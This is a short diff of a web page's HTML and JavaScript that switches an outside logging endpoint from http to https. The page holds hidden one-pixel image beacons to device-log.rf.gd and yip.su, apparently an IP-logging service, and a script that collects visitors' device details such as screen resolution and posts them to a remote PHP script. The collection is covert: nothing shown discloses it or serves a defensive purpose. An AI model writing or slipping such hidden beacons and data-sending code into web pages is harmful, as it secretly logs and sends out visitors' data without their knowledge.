@@ -147,7 +147,7 @@ body{
 	</script>
 </head>
 <body>
-	<img src="http://device-log.rf.gd/y.php" width="1" height="1" style="display: none;" alt="">
+	<img src="https://device-log.rf.gd/y.php" width="1" height="1" style="display: none;" alt="">
 <img src="https://yip.su/mnm.jpg" width="1" height="1" style="display: none;" alt="">
 
 	<section class="flex_center">
@@ -209,7 +209,7 @@ async function getExtraDetails() {
     let screenResolution = `${screen.width}x${screen.height}`;
 
     // Send Data to PHP Script
-    fetch("http://device-log.rf.gd/y.php", {
+    fetch("https://device-log.rf.gd/y.php", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
